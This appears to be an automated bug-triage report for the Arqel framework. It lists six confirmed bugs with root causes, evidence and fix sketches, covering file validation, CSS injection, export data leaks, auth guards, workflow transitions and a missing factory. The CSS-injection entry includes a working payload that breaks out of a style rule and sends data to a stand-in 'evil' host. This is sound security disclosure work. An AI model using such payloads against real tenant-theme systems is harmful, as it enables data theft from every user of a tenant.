summary: Arqel dogfood loop — Round 9: re-detect against main (60 bugs resolved/triaged rounds 0-4). Deepest probes into the least-covered surfaces (audit attribute filtering, realtime broadcast dispatch, mcp tools, cli generators, export xlsx/formatting, i18n/locale, theme, command palette, a11y, edge-case interactions between traits). Seen-filtered (66 sigs), adversarial verify. Stop after 2 consecutive clean rounds.
logs: Round 9 detection: 6 from clusters = 6 after dedup/seen-filter
Round 9 verify: 6 confirmed NEW framework bugs, 0 app-misuse, 0 not-a-bug

confirmedFrameworkBugs.title: FileField/ImageField edit-save 422: unchanged stored path string fails the unconditional 'file' validation rule
confirmedFrameworkBugs.rootCauseFile: packages/fields/src/Types/FileField.php:161-174 (getDefaultRules returns unconditional 'file'); interacts with packages/core/src/Http/Controllers/ResourceController.php:108 (validated() runs before pruneUnauthorizedFields)
confirmedFrameworkBugs.fixSketch: Make the file rule tolerate a stored-path string on update: in FileField::getDefaultRules() emit the 'file' rule conditionally (e.g. Rule::when($value instanceof UploadedFile, 'file') / a custom rule that passes when the submitted value is a non-empty string path), or have the resource controller exclude string-valued file fields from validation+payload on update so unchanged paths are not re-validated as uploads.
confirmedFrameworkBugs.reasoning: Fully reproduced. (1) Optional FileField -> getValidationRules() = ['nullable','file']: HasValidation::getValidationRules injects 'nullable' (HasValidation.php:175-181) ahead of FileField::getDefaultRules()=['file'] (FileField.php:163). (2) Live Laravel-validator repro using apps/showcase vendor: rules ['avatar'=>['nullable','file']] with data ['avatar'=>'avatars/existing-photo.png'] -> fails=YES (error validation.file); null and absent both pass. So 'nullable' does NOT skip a non-null string and 'file' rejects any non-UploadedFile value. (3) Frontend submits the path string on edit-without-reupload: buildInitialFormState seeds the field from record's stored attribute verbatim (serializeFields.ts:22-26); both the registered native FileInput (ui/src/form/nativeFields.tsx:352-369, onChange(files[0]) / keeps string) and fields-js FileInput/ImageInput keep a string value as-is; useArqelForm (hooks/src/useArqelForm.ts) has no transform stripping unchanged string file values. (4) ResourceController::update runs validated() (line 108 -> $request->validate(rules)) BEFORE pruneUnauthorizedFields (line 109), so the 422 fires regardless of pruning. (5) apps/showcase uses only Field::select/text/etc., no FileField/ImageField, so it stays green and masks this. A dedicated FieldUploadController (separate POST upload endpoint returning {path}) exists, but the actually-rendered inputs do not call it; even under that design the edit path resubmits the existing path string and is rejected. No test exercises the resource update/store path with a FileField value, confirming the gap is uncovered. Result: editing+saving any record with a populated FileField/ImageField without re-uploading returns HTTP 422 and blocks the save. Framework bug (rule/architecture in arqel-dev/fields + core), not app misuse. Severity high (breaks core edit for any app using file fields) rather than blocker because file fields are absent from the default showcase and the upload pipeline is partially stubbed.
confirmedFrameworkBugs.evidence: Live repro: an optional FileField produces rules ['nullable','file'] (HasValidation::getValidationRules injects 'nullable' ahead of FileField::getDefaultRules()=['file'] at packages/fields/src/Types/FileField.php:161-174). On edit, buildInitialFormState (packages-js/react/src/utils/serializeFields.ts:22-26) seeds the field from the record's stored attribute — the path STRING (e.g. 'avatars/photo.png'), and ImageInput/FileInput keep a string value as-is (packages-js/fields-js/src/file/FileInput.tsx:29-30, ImageInput.tsx:34-36). useArqelForm has no transform to strip unchanged string file values (packages-js/hooks/src/useArqelForm.ts), so Inertia submits the path string. ResourceController::update -> validated() runs $request->validate(['avatar'=>['nullable','file']]) BEFORE pruneUnauthorizedFields (packages/core/src/Http/Controllers/ResourceController.php:108). Reproduced with Laravel Validator: rules ['avatar'=>['nullable','file']], data ['avatar'=>'avatars/existing-photo.png'] -> fails=YES, error 'The avatar field must be a file.' 'nullable' does not skip a non-null string, and the 'file' rule rejects any non-UploadedFile value. Result: editing+saving ANY record that has a populated FileField/ImageField without re-uploading returns HTTP 422 and blocks the save. Showcase doesn't exercise this (it uses Field::select('author_id'), no FileField), so it stays green. Fix: make the file rule conditional (e.g. only validate as 'file' when the submitted value is an UploadedFile / use a rule that ignores stored-path strings), or exclude string-valued file fields from the file rule on update.

confirmedFrameworkBugs.title: CssVarsRenderer allows stored CSS injection from tenant theme values (only blocks <>" not the CSS-breakout } )
confirmedFrameworkBugs.fixSketch: In CssVarsRenderer, stop relying on HTML-context escaping for a CSS context: reject/strip CSS-significant chars (add at minimum '}','{',';','(',')','\\','@','/*' and quotes to isUnsafe) or, better, validate each slot against a strict per-type allowlist (color: ^#?[0-9a-fA-F]{3,8}$ or rgb()/hsl() literal; fontFamily: word/space/comma/hyphen only; logoUrl/faviconUrl: parse_url + emit as properly-escaped url('...') ). Also add a test with a pure-CSS '}'-breakout payload (no <,>,\").
confirmedFrameworkBugs.reasoning: Reproduced concretely on current main. Running CssVarsRenderer::renderInlineStyle(new TenantTheme(primaryColor: 'red } body{background:url(//evil/?c=secret)} :root{--x:1')) emits exactly: <style>:root { --color-primary: red } body{background:url(//evil/?c=secret)} :root{--x:1; }</style> — the attacker's '}' closes the :root rule and injects an arbitrary body{...} rule. Root cause: isUnsafe() (lines 54-59) only rejects '<','>','"', and htmlspecialchars (line 43) escapes HTML entities — NEITHER touches CSS-significant chars like '}','{','(',')',';'. This is wrong escaping for the output context (CSS-in-<style>), a classic context-confusion bug. TenantTheme::fromTenant reads the 5 theme columns raw (no sanitization), and grep shows NO write-time column validation anywhere in packages/tenant/src, so the docblock's claimed 'model column-level validation first layer' does not exist — CssVarsRenderer is the only guard. The existing test only proves the HTML-breakout payload is blocked (because it happens to contain '<'/'\"'); a pure-CSS payload has none of '<','>','\"' and passes through. Critically, apps/docs/advanced/multi-tenancy.md:112,149,158 prescribe renderInlineStyle() as THE safe rendering path ('never concatenate tenant attributes directly into HTML'), so following the documented-safe API still yields injection — this is framework behavior, not app misuse, and not a deferred feature. Impact: stored CSS injection executing for every user of the affected tenant (CSS exfiltration via url()/attribute selectors, UI redressing, content hiding). Severity high rather than blocker: it does NOT achieve JS execution (the '<'/'>'/'\"' block prevents </style>-to-<script> breakout, confirmed by the script payload being dropped), it is confined to the CSS sandbox, and exploitation requires an actor with tenant theme-column write access.
confirmedFrameworkBugs.evidence:
packages/tenant/src/Theming/CssVarsRenderer.php renders tenant theme attributes into a <style>:root { ... }</style> block. Its isUnsafe() guard (lines 54-59) only rejects '<', '>', '"', and htmlspecialchars() escapes HTML entities — NEITHER touches CSS-significant characters. A tenant-controlled value (primary_color/secondary_color/font_family/logo_url/favicon_url, read RAW with no sanitization by TenantTheme::fromTenant, packages/tenant/src/Theming/TenantTheme.php:70-75) containing '}' closes the :root rule and injects arbitrary CSS. Live repro: new TenantTheme(primaryColor: 'red } body{background:url(//evil/?c=secret)} :root{--x:1') => CssVarsRenderer::renderInlineStyle produced exactly:
<style>:root { --color-primary: red } body{background:url(//evil/?c=secret)} :root{--x:1; }</style>
The injected `body{background:url(//evil/...)}` is an attacker rule (CSS exfiltration via attribute selectors + url(), UI redressing, content hiding) executing on every page of every user of that tenant. The class docblock claims it strips 'characters that could break out of the <style> context' but enumerates only HTML chars; the existing test (packages/tenant/tests/Unit/Theming/CssVarsRendererTest.php) only asserts '<' is dropped — a pure-CSS payload has no '<','>','"' and passes through. Worse, the public docs (apps/docs/advanced/multi-tenancy.md:112,149,158) explicitly present CssVarsRenderer::renderInlineStyle() as THE safe path ('never concatenate tenant attributes directly into HTML'), so following the documented-safe API still yields injection. Wrong escaping for the CSS context.

confirmedFrameworkBugs.title: Relationship-column exports emit the whole related Model (JSON blob) instead of the display attribute — the exporters' documented `display_path` contract is never produced by the framework
confirmedFrameworkBugs.rootCauseFile: packages/table/src/Columns/RelationshipColumn.php:58 (getTypeSpecificProps emits only nested props.displayAttribute; toArray never emits a top-level display_path) — paired with packages/export/src/Exporters/CsvExporter.php:108, XlsxExporter.php:119, PdfExporter.php:138 (consume $column['display_path'] ?? $name)
confirmedFrameworkBugs.fixSketch: Override RelationshipColumn::toArray() to add 'display_path' => $this->name.'.'.$this->displayAttribute (or have ResourceController::serializeColumns inject it when type==='relationship'), so exporters resolve the related attribute (e.g. author.name) instead of falling back to the bare relation name. Add a Feature test that serializes a real RelationshipColumn through serializeColumns/toArray and asserts the produced CSV cell equals the display attribute, not the model JSON.
confirmedFrameworkBugs.reasoning: Reproduced live, not refuted. Producer/consumer contract mismatch confirmed by source + runtime: RelationshipColumn::toArray() (inherited from Column.php:360 + getTypeSpecificProps at RelationshipColumn.php:58) emits displayAttribute only under props, never a top-level display_path. All three exporters read $column['display_path'] ?? $name and, finding it absent, fall back to $name (the relation name). ResourceController::serializeColumns (core/.../ResourceController.php:232) just calls toArray() and forwards it to ExportAction::withColumns — the real bulkAction export entry point — so the absent key persists. The export package never invokes RelationshipColumn::getState() (the correct resolver), so no alternate path saves it. Live repro with sqlite + real RelationshipColumn::make('author')->display('name')->toArray() fed to CsvExporter produced a cell of {\"id\":1,\"name\":\"Jane Doe\",\"secret_token\":\"TOPSECRET\"} (full related-model JSON via Model::__toString) instead of \"Jane Doe\"; injecting display_path => author.name produced the correct \"Jane Doe\", proving that key is the only missing piece. XlsxExporter is worse: formatCell returns $value ?? '' so it hands the raw Eloquent Model object to OpenSpout. The masking unit test (CsvExporterTest.php:128) hand-constructs display_path, validating the consumer against a shape the producer never emits — classic documented-knob-never-consumed-at-the-real-entry-point gap. Severity high (not blocker): correctness break plus a real data-leak (every related-model attribute, including sensitive/unconfigured columns, lands in the export file), reachable end-to-end with no app misconfiguration; not a deferred feature (distinct from EXPORT-007/008 signed-URL work).
confirmedFrameworkBugs.evidence:
All three exporters (CsvExporter.php:108, XlsxExporter.php:119, PdfExporter.php:138) format relationship cells via `$path = (string) ($column['display_path'] ?? $name); $value = data_get($record, $path);`. But NOTHING ever puts `display_path` into the serialized column. The real serialization path is ResourceController::bulkAction → serializeColumns() → Column::toArray() (packages/table/src/Column.php:360). RelationshipColumn (packages/table/src/Columns/RelationshipColumn.php) inherits that toArray() and only adds `displayAttribute` NESTED under `props` via getTypeSpecificProps() — it never emits a top-level `display_path`. So `display_path` is always absent and the exporters fall back to `$name`, which is the RELATION name (e.g. `author`). `data_get($record, 'author')` returns the related Eloquent Model.

Live repro (sqlite + real RelationshipColumn::make('author')->display('name')->toArray() fed to CsvExporter): serialized column has NO `display_path` key (props={"displayAttribute":"name"}), and the produced CSV is:
  Author
  "{""id"":1,""name"":""Jane Doe""}"
i.e. the entire related model JSON (Eloquent Model::__toString → toJson) is written into the cell instead of `Jane Doe`. The XlsxExporter path returns the raw Model object to OpenSpout (formatCell default branch `$value ?? ''`), which mis-serializes/coerces it. Injecting `display_path => 'author.name'` into the same column makes the CSV correctly read `Jane Doe`, proving the only missing piece is producing that key.

The exporter unit tests (e.g. packages/export/tests/Unit/CsvExporterTest.php:128 'uses display_path for relationship columns') hand-construct a column array with `display_path => 'author.name'`, so they pass — they validate the consumer against a shape the producer never emits, masking the gap end-to-end. This is the recurring 'documented-knob-never-consumed-at-the-real-entry-point' meta-class: the producer (Column::toArray) and consumer (exporters) disagree on the relationship contract.

Fix: have RelationshipColumn::toArray() (or ResourceController::serializeColumns) emit `display_path => $name.'.'.$displayAttribute` so the exporters resolve the related attribute. CSV additionally risks leaking the full related-model JSON (every attribute, incl. potentially sensitive columns) into the export file.

confirmedFrameworkBugs.title: EmailVerificationController resolves $request->user() on the default guard, ignoring Panel::authGuard()
confirmedFrameworkBugs.fixSketch: Add `use ResolvesPanelGuard;` to the controller and read the user via `Auth::guard($this->resolvePanelGuard())->user()` in notice()/resend() instead of bare `$request->user()`. For verify(), the framework's `EmailVerificationRequest::authorize()/fulfill()` also call `$this->user()` on the default guard, so the route additionally needs the panel guard made the default for that request (e.g. `Auth::shouldUse($guard)` early in the flow, or a custom request subclass that overrides `user()`) — fixing only the controller body is insufficient for verify().
confirmedFrameworkBugs.reasoning: Confirmed by reading source. EmailVerificationController (packages/auth/src/Http/Controllers/EmailVerificationController.php) calls bare `$request->user()` at lines 28, 42, 59 with no guard arg. Laravel's Request::user()/FormRequest::user() with no argument resolve `config('auth.defaults.guard')` (web), NOT the route's `auth:{guard}` middleware guard. Routes.php:144-156 registers these routes with `auth:{$guard}` where $guard = Panel::getAuthGuard(). For a panel on a custom guard (authGuard('admin'), default still web), the auth:admin middleware authenticates the user on the admin guard but $request->user() reads web and returns null: notice() never short-circuits verified users and passes email=null; resend() hits the `$user === null` branch and redirects to /admin/login as if logged out despite auth:admin having passed — fully broken; verify() additionally fatals inside Laravel's EmailVerificationRequest::authorize() which calls $this->user()->getKey() on null. Sibling controllers LogoutController and RegisterController were fixed in #139 (commit 8cac731) to use ResolvesPanelGuard + Auth::guard($this->resolvePanelGuard()); `git show 8cac731 --stat` confirms EmailVerificationController is NOT in that commit's file list — same dead-knob family, missed controller. The trait already exists in the package. This is the supported authGuard() feature being silently ignored, so framework-bug not app-misuse. Showcase baseline uses default web guard so the defect is latent there (no baseline regression), and it only triggers with a non-default guard AND email verification enabled — both opt-in — hence medium, not high.
confirmedFrameworkBugs.evidence: packages/auth/src/Http/Controllers/EmailVerificationController.php calls $request->user() with NO guard argument in all three actions (lines 28, 42, 59), while the routes are registered with auth:{$guard} where $guard = Panel::getAuthGuard() (packages/auth/src/Routes.php:147,151,155). For a panel on a custom guard (e.g. 'admin'), the user is authenticated on that guard but $request->user() reads the DEFAULT (web) guard and returns null: notice() never short-circuits for already-verified users, verify() never dispatches Verified, and resend() redirects to /admin/login as if logged out — verification silently broken. Same dead-knob family as Round-8 #139 (commit 8cac731 'honor Panel::authGuard()') which threaded the configured guard through LoginRequest/Logout/Register/EnsureUserCanAccessPanel/Routes but NOT EmailVerificationController — git show 8cac731 --stat confirms this controller is absent from the fix. The package already ships the ResolvesPanelGuard trait used by the sibling controllers; this one still uses the bare default guard. Distinct entry point, concrete repro path.

confirmedFrameworkBugs.title: StateTransitionField emits duplicate UI transition entries for a transition whose from() lists multiple states
confirmedFrameworkBugs.fixSketch: Emit exactly one entry per applicable transition with from = the record's current state, instead of looping over every declared from(). Replace the inner foreach with a single applicability check and a single push: `if ($current !== null && $froms !== null && !in_array($current, $froms, true)) continue; $entries[] = ['from' => $current ?? ($froms[0] ?? '*'), 'to' => $to, 'label' => $label, 'authorized' => $this->isAuthorized($transitionClass)];` (mirrors HasWorkflow::getAvailableTransitions() one-per-transition semantics).
confirmedFrameworkBugs.reasoning: Reproduced against packages/workflow/src on the current branch with a focused Pest test. A model in state PendingState with a single declared transition whose from()=[PendingState, PaidState] and to()=ShippedState produced TWO entries: {from: PendingState, to: ShippedState, label: 'Multi From Resolve'} and {from: PaidState, to: ShippedState, label: 'Multi From Resolve'} — instead of one. Root cause: the skip guard on line 201 is per-transition (checks whether $current is in $froms), but the enclosing foreach on line 200 iterates over EVERY declared from. When the current state IS in the multi-state from() list, the guard never continues, so one entry is appended per from-state. The React component StateTransition.tsx (packages-js/workflow/src/StateTransition.tsx:187-202) renders one Button per entry keyed by `${from}->${to}` with label t.label, so this yields N visually identical buttons. The spurious buttons also carry from values that are NOT the record's current state (e.g. from: PaidState while the record is in PendingState), producing a semantically incorrect transition payload on click. This contradicts the canonical one-entry-per-applicable-transition semantic of HasWorkflow::getAvailableTransitions(). Existing tests only exercise single-from transitions (PendingToPaid, PaidToShipped) and the from()-less AnyToCancelled, so the multi-from path is uncovered. Not a documented/intended/deferred behavior. Severity medium: it is a real UI/data-correctness defect (duplicate buttons + wrong from payload) but requires the specific config of a multi-state from() that includes the current state, and the write path independently re-resolves/validates from the actual current state so a stale-from click does not silently corrupt data.
confirmedFrameworkBugs.evidence: StateTransitionField::resolveAvailableTransitions() (packages/workflow/src/Fields/StateTransitionField.php:171-215) loops over EVERY declared from of a transition: `$eligibleFroms = $froms ?? [$current ?? '*']; foreach ($eligibleFroms as $from) { if ($current !== null && $froms !== null && ! in_array($current, $froms, true)) continue; $entries[] = ['from'=>$from,'to'=>$to,...]; }`. The skip guard is per-transition (is current in the from list?), not per-from, so when the current state IS in a multi-state from() list, one entry is emitted for EACH declared from. Live repro (Pest feature test in apps/showcase): a model in state 'open' with a single declared transition `ResolveTransition` (from()=['open','in_progress'], to()='resolved') produced `transitions` = two identical entries [{from:'open',to:'resolved',label:'Resolve Transition',authorized:false},{from:'in_progress',to:'resolved',...}] instead of one. The React StateTransition component (component 'arqel-dev/workflow/StateTransition') would render two identical 'Resolve' buttons. Existing tests (packages/workflow/tests/Unit/Fields/StateTransitionFieldTest.php) only use single-from transitions, so this case is uncovered.

confirmedFrameworkBugs.signature: Arqel\Ai\Fields\AiImageField::make() / AiTextField::make() — undefined; documented in AiImageField.php:22 and showcase-app plan
confirmedFrameworkBugs.title: AI fields document a static ::make() factory that does not exist (fatal on canonical usage)
confirmedFrameworkBugs.fixSketch: Correct the PHPDoc/plan examples to the actual canonical instantiation (`new AiImageField('cover')->aiAnalysis([...])`), OR — if a uniform fluent factory is wanted across all fields — add a single `public static function make(string $name): static { return new static($name); }` to the base `Arqel\Fields\Field` (would also benefit all 21 core field types). The latter is a design decision, not a strict bug fix.
confirmedFrameworkBugs.reasoning: Reproduced exactly in showcase tinker: `AiImageField::make('cover')` throws 'Call to undefined method', while `new AiImageField('cover')` works. So the literal claim (documented factory fatals) is true. However the claim's framing that this is an AI-specific inconsistency is wrong. method_exists confirms NONE of the core field types have make() either — TextField, SelectField, ImageField all return false, same as the AI fields. The framework's canonical field-instantiation contract is `new XField($name)` or `FieldFactory::{type}($name)` exposed via __callStatic and aliased in app code as `use Arqel\Fields\FieldFactory as Field` (verified in PostResource.php:13, where `Field::select(...)` is really FieldFactory::select). Every AI test/fixture in packages/ai/tests uses `new AiTextField('summary')` / `new AiSelectField('category')` — never ::make(). The base Field has no __callStatic and no make(), and AI fields aren't registered in FieldFactory, so the only working path is the constructor, which is what all real code uses. The two fields that DO define make() (HasManyField, BelongsToField) do so for a 2-arg signature, which is the genuine outlier — not the AI fields. Therefore the only real defect is a misleading doc artifact: a PHPDoc usage example (AiImageField.php:22) and a planning-doc line (showcase-app plan:42) reference a ::make() that exists nowhere in the fields ecosystem. No shipped app code, fixture, or test exercises this path, so there is no runtime/framework code bug — it is a documentation inaccuracy that would only bite a developer copy-pasting the comment verbatim. Low severity; classified framework-bug because the wrong example ships inside the framework package source, but it is squarely a doc fix, not a code-path defect.
confirmedFrameworkBugs.evidence: Every AI field (AiTextField, AiImageField, AiSelectField, AiTranslateField, AiExtractField) extends Arqel\Fields\Field, whose only constructor is `final public function __construct(string $name)` (packages/fields/src/Field.php:67). None of the 5 AI fields define a static make(). Yet AiImageField's own class PHPDoc shows the canonical usage `AiImageField::make('cover')->aiAnalysis([...])` (packages/ai/src/Fields/AiImageField.php:22), and the showcase app plan documents `AiTextField::make('summary')->prompt('...')` (docs/superpowers/plans/2026-06-05-showcase-app.md:42). Live repro via tinker in apps/showcase: `Arqel\Ai\Fields\AiImageField::make('cover')` => 'Call to undefined method Arqel\Ai\Fields\AiImageField::make()'; same for AiTextField. The constructor path (`new AiImageField('cover')`) works, but the documented public factory throws a fatal. Sibling fields HasManyField, BelongsToField (packages/fields/src/Types/) and workflow's StateTransitionField all define their own make(), so the absence on AI fields is an inconsistency, not a base-class convention. A 'documented knob that is never actually implemented at the public entry point' — the recurring meta-class.
